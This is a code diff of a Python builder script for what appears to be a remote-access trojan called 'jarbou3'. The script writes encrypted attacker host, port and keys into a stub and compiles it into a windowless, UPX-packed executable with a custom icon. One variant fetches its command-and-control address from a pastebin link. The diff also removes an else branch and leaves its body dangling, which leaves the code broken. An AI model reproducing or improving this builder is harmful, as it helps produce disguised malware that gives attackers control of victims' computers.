@@ -42,7 +42,7 @@ def replace_string(filename, old_string, new_string):
 
 def build():
     global key
-    if platform.system() == "windows":
+    if platform.system() == "Windows":
         try:
             import socket
             import json
@@ -76,9 +76,8 @@ def build():
             exit()
 
 
-    else:
-        import os
-        from os.path import  isfile
+
+
         def genkey(length: int) -> bytes:
             return os.urandom(length)
 
@@ -107,10 +106,10 @@ def build():
             icon = ""
             while isfile(icon) == False:
                 icon = input('entre your icon path:')
-            if platform.system() == "windows":
+            if platform.system() == "Windows":
                 os.system('powershell -c cd stub; cp jarbou3.py ..')
             else:
-                os.system("cp -r stub/jarbou3.py ..")
+                os.system("cp -r stub/Jarbou3.py ..")
             replace_string('jarbou3.py', '$lhost', str(cryptedhost))
             replace_string('jarbou3.py', '$lport', str(cryptedport))
             replace_string("jarbou3.py","$hostkey",str(keyhost))
@@ -119,12 +118,12 @@ def build():
             replace_string('jarbou3.py', '$key', key)
 
             print('[+]Compiling')
-            if platform.system() == "windows":
+            if platform.system() == "Windows":
                 os.system('pyinstaller --noconfirm --onefile --windowed --upx-dir upx --icon  "' + icon + '"  "jarbou3.py"')
             else:
                 os.system('wine pyinstaller --noconfirm --onefile --windowed --upx-dir upx --icon  "' + icon + '"  "jarbou3.py"')
 
-            if platform.system() == "windows":
+            if platform.system() == "Windows":
                 os.system('powershell -c cd dist; mv jarbou3.exe ..')
                 os.remove('jarbou3.py')
             else:
@@ -135,10 +134,10 @@ def build():
             u = requests.get(URL).text
             sp = u.split(':')
             print('host is:'+sp[0]+'\n port is:'+sp[1])
-            if platform.system() == "windows":
-                os.system('powershell -c cd stub; cp jarbou3-pastebin.py ..')
+            if platform.system() == "Windows":
+                os.system('powershell -c cd stub; cp Jarbou3-pastebin.py ..')
             else:
-                os.system("cp -r stub/jarbou3-pastebin.py ..")
+                os.system("cp -r stub/Jarbou3-pastebin.py ..")
             ask = input('is  those your host and port(y/n):')
             if ask == 'y':
                 replace_string('jarbou3-pastebin.py','$pastebin',URL)
@@ -147,7 +146,7 @@ def build():
                 while isfile(icon) == False:
                     icon = input('entre your icon path:')
                 print('[+]Compiling')
-                if platform.system() == "windows":
+                if platform.system() == "Windows":
                     os.system('pyinstaller --noconfirm --onefile --windowed --icon "' + icon + '"  "jarbou3-pastebin.py"')
                     os.system('powershell -c cd dist; mv jarbou3-pastebin.exe ..')
                 else:
